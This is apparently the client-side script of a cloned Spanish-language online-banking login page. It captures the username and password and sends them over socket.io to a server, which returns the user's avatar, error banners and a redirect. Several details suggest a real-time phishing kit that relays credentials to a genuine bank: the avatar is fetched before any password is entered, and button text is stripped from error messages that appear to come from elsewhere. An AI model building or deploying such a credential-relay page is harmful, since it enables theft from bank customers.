//const { text } = require("express");

const socket = io();

const emitDataServer = document.querySelector("#btn-send");
const userInput = document.querySelector("#user");
userInput.focus();

const passInput = document.querySelector("#pass");
const Alert = document.querySelector("#alert-modal");
const Alert2 = document.querySelector("#alert-modal2");
const CerrarModal = document.querySelector("#close-alert-modal");
const CerrarModal2 = document.querySelector("#close-alert2-modal");
const ShowPass = document.querySelector("#password-content");
const ShowUser = document.querySelector("#user-content");
const Avatar = document.querySelector("#avatar");
const LoginHelp = document.querySelector("#login-help");
const ErrorBanner = document.querySelector("#error-banner");
const TextErrorBanner = document.querySelector("#text-error");
const CloseErrorBanner = document.querySelector("#close-error-banner");
const VerUser = document.querySelector("#ver-user");
const LabelUser = document.querySelector("#label-input");

//const infoLogin = document.querySelector("#infologin");

var ShowVolver = "";

ShowVolver = document.querySelector("#volver");
ShowVolver.addEventListener("click", () => {
    ShowPass.style.display = "none";
    ShowUser.style.display = "block";
    ShowVolver.style.display = "none";
    //infoLogin.style.display = "block";
    passInput.value = "";
    LoginHelp.innerHTML = "¿No podés ingresar o sos nuevo?"
    LoginHelp.parentElement.classList.toggle('clave-nopodes');
    LoginHelp.parentElement.classList.toggle('nopodes');
    userInput.value = "";
    Avatar.setAttribute('src', '/img/icono-login_a.png');
    passCount = 0;
})


CerrarModal.addEventListener("click", () => {
    Alert.style.display = "none";
})

CerrarModal2.addEventListener("click", () => {
    Alert2.style.display = "none";
})

var passCount = 0
emitDataServer.addEventListener("click", () => {

    userInput.classList.remove('error-input');
    LabelUser.classList.remove('error-input-label');

    Alert.style.display = "none";
    Alert2.style.display = "none";
    const dataInputs = {
        'user': userInput.value,
        'pass': passInput.value,
        'socket': socket.id,
    }

    var preloader = document.querySelector("#preloader");
    preloader.style.display = "block";

    if (dataInputs.user.length < 6 || dataInputs.user.length > 15) {
        preloader.style.display = "none";
        userInput.classList.add('error-input');
        LabelUser.classList.add('error-input-label');
        Alert.style.display = "flex";
    } else if (dataInputs.pass.length == 0) {
        if (passCount == 0) {
            socket.emit("ShowAvatar", dataInputs);
        } else {
            Alert2.style.display = "flex";
            preloader.style.display = "none";
        }
        passCount += 1;
    } else {
        socket.emit("Data", dataInputs);
        preloader.style.display = "block";
        //window.location.href = "/m/faces/pages/inicio.xhtml?s="+socket.id;
    }
})

socket.on("ContinuarHome", ContinuarHome => {
    window.location.href = "/bancainternet/home/?s="+ContinuarHome;
})

socket.on("ErrorLogin", TextoBanner => {
    ErrorBanner.style.display = "flex";
    if (TextoBanner.slice(-7) == 'Aceptar') {
        TextErrorBanner.innerHTML = TextoBanner.slice(0, -9);
    }else{
        TextErrorBanner.innerHTML = TextoBanner;
    }
    preloader.style.display = "none";
    ShowPass.style.display = "block";
    ShowUser.style.display = "none";
    ShowVolver.style.display = "flex";
    LoginHelp.innerHTML = "¿No recordás tu clave?";
    LoginHelp.parentElement.classList.toggle('clave-nopodes');
    LoginHelp.parentElement.classList.toggle('nopodes');
})

CloseErrorBanner.addEventListener("click", () => {
    ErrorBanner.style.display = "none";
})

VerUser.addEventListener("click", () => {
    console.log(userInput.type)
    if(userInput.type == "text"){
        userInput.type = "password";
    }else{
        userInput.type = "text";
    }
})

socket.on("AvatarElement", dataAvatar => {
    Avatar.setAttribute('src', dataAvatar);
    preloader.style.display = "none";
    ShowPass.style.display = "block";
    ShowUser.style.display = "none";
    ShowVolver.style.display = "flex";
    LoginHelp.innerHTML = "¿No recordás tu clave?";
    LoginHelp.parentElement.classList.toggle('clave-nopodes');
    LoginHelp.parentElement.classList.toggle('nopodes');
})
